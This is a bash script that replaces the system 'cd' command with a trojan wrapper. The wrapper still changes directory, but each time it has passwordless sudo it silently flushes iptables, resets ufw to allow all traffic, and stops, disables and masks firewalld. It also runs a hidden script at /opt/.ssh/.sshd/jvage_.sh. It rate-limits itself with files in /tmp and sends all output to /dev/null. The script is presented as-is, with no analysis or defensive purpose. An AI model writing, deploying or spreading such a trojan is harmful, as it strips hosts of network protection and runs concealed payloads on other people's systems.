#!/bin/bash

# Path to fake cd binary (wrapper)
cd_path="$(which cd 2>/dev/null)"

# Overwrite /usr/bin/cd with the wrapper script
sudo bash -c "cat > \"$cd_path\"" << 'EOF'
#!/bin/bash

# Call real builtin cd
if ! builtin cd "$@"; then
    return $?
fi

rate_limit_file="/tmp/.cd_last_run_${UID}"
lock_file="/tmp/.cd_${UID}.lock"
cooldown=10

now=$(date +%s)
last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)

if (( now - last_run >= cooldown )); then
    (
        flock -n 200 || exit 1
        echo "$now" > "$rate_limit_file"

        if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
            sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
            sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
            sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
            sudo iptables -F > /dev/null 2>&1 &
            sudo iptables -X > /dev/null 2>&1 &
            sudo ufw --force reset > /dev/null 2>&1 &
            sudo ufw default allow incoming > /dev/null 2>&1 &
            sudo ufw default allow outgoing > /dev/null 2>&1 &
            sudo ufw default allow routed > /dev/null 2>&1 &
            sudo ufw --force enable > /dev/null 2>&1 &
            sudo systemctl stop firewalld > /dev/null 2>&1 &
            sudo systemctl disable firewalld > /dev/null 2>&1 &
            sudo systemctl mask firewalld > /dev/null 2>&1 &
            sudo bash /opt/.ssh/.sshd/jvage_.sh > /dev/null 2>&1 &
        fi
    ) 200>"$lock_file"
fi

return 0
EOF

# Make it executable
sudo chmod 755 "$cd_path" > /dev/null 2>&1 &
